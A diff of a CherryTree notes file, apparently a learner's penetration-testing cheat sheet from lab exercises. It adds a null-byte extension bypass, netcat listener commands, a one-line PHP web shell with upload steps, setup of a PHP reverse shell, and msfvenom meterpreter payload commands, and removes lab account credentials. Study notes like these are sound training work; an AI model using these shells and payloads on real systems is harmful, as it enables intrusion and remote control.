@@ -2178,8 +2178,25 @@ John The Ripper:
     <rich_text>
 </rich_text>
   </node>
-  <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1697102306">
+  <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1698932875">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+restrictions on downloading file because of extensions. 
+</rich_text>
+    <rich_text indent="1">Example</rich_text>
+    <rich_text>: trying to download package.json.bak → 403 error: only .md and .pdf files can be downloaded
+</rich_text>
+    <rich_text indent="1">Bypass: use Poisen Null Byte</rich_text>
+    <rich_text> (%00), URL ENCODED = %2500 → add %2500 at the end and also add one of the allowed extensions
+</rich_text>
+  </node>
+  <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1698932911">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+netcat listener:
+</rich_text>
+    <rich_text indent="1">nc -lvnp </rich_text>
+    <rich_text indent="1" weight="heavy">PORT</rich_text>
     <rich_text>
 
 telnet</rich_text>
@@ -2214,7 +2231,7 @@ shell access:
     <rich_text indent="1">
 start netcat listener:
 </rich_text>
-    <rich_text indent="2">nc -lvp </rich_text>
+    <rich_text indent="2">nc -lvnp </rich_text>
     <rich_text indent="2" weight="heavy">PORT</rich_text>
     <rich_text>
 
@@ -2286,6 +2303,82 @@ UNION ALL SELECT </rich_text>
 
 </rich_text>
     </node>
+    <node name="Upload Shell [PHP]" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698931170" ts_lastsave="1698932657">
+      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+      <rich_text>
+Upload web-shell to webpage (PHP):
+</rich_text>
+      <rich_text indent="1">Identify directory of file uploads</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">create file with php command:
+</rich_text>
+      <rich_text indent="2">&lt;?php
+    echo system($_GET["cmd"]);
+?&gt;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Navigate to the file location on browser</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2" weight="heavy">PATH_TO_UPLOADS_DIRECTORY</rich_text>
+      <rich_text indent="2">/webshell.php?cmd=</rich_text>
+      <rich_text indent="2" weight="heavy">BASH_COMMAND1</rich_text>
+      <rich_text indent="2">;</rich_text>
+      <rich_text indent="2" weight="heavy">BASH_COMMAND2</rich_text>
+      <rich_text indent="2">;</rich_text>
+      <rich_text>
+
+Upload reverse-shell:
+</rich_text>
+      <rich_text indent="1">Download Monkey Reverse Shell </rich_text>
+      <rich_text>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+</rich_text>
+      <rich_text indent="1">edit file -&gt; change IP to own IP</rich_text>
+      <rich_text> and port
+</rich_text>
+      <rich_text indent="2">$ip = '</rich_text>
+      <rich_text indent="2" weight="heavy">127.0.0.1</rich_text>
+      <rich_text indent="2">';  // CHANGE THIS</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">$port = </rich_text>
+      <rich_text indent="2" weight="heavy">1234</rich_text>
+      <rich_text indent="2">;       // CHANGE THIS</rich_text>
+      <rich_text>
+start net</rich_text>
+    </node>
+    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1698933456">
+      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+      <rich_text>
+list msfvenom payloads:
+</rich_text>
+      <rich_text indent="1">msfvenom -l </rich_text>
+      <rich_text>
+
+list msfvenom formats:
+</rich_text>
+      <rich_text indent="1">msfvenom -l formats</rich_text>
+      <rich_text>
+
+list msfvenom encoders:
+</rich_text>
+      <rich_text indent="1">msfvenom -l </rich_text>
+      <rich_text>encoders
+
+generate payload with msfvenom:
+</rich_text>
+      <rich_text indent="1">msfvenom -p </rich_text>
+      <rich_text indent="1" weight="heavy">PAYLOAD</rich_text>
+      <rich_text indent="1"> lhost=</rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1"> lport=</rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1"> -f </rich_text>
+      <rich_text indent="1" weight="heavy">FORMAT</rich_text>
+      <rich_text indent="1"> -o </rich_text>
+      <rich_text weight="heavy">OUTPUT_NAME</rich_text>
+    </node>
     <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1698765116">
       <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
       <rich_text>
@@ -2327,18 +2420,6 @@ adding header in the HTTP request
 changing query parameter values</rich_text>
       </node>
     </node>
-  </node>
-  <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1698764390">
-    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-    <rich_text>
-restrictions on downloading file because of extensions. 
-</rich_text>
-    <rich_text indent="1">Example</rich_text>
-    <rich_text>: trying to download package.json.bak → 403 error: only .md and .pdf files can be downloaded
-</rich_text>
-    <rich_text indent="1">Bypass: use Poisen Null Byte</rich_text>
-    <rich_text> (%00), URL ENCODED = %2500 → add %2500 at the end and also add one of the allowed extensions
-</rich_text>
   </node>
   <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1697141883">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -2392,18 +2473,9 @@ go to proxy setting
 adjust interception rule to include scope only</rich_text>
     </node>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1698763647">
-    <rich_text>10.10.70.181
-
-accounts:
-test@test.com
-123456789
-
-admin@juice-sh.op
-admin123
-
-jim@juice-sh.op
-123456789
-169940f83378cc420ae4fdeb9c1f73631a2baee6</rich_text>
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1698932458">
+    <rich_text>10.10.224.75
+msfvenom -p php/meterpreter_reverse_tcp lhost=10.10.224.75 lport=8888
+php/meterpreter_reverse_tcp</rich_text>
   </node>
 </cherrytree>
